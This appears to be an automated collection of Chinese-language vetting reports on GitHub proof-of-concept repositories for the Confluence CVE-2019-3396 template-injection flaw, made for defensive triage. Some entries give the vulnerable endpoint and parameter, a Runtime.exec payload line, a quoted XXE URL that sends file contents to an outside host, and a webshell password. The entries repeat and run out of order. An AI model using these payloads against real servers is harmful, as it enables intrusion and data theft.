**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
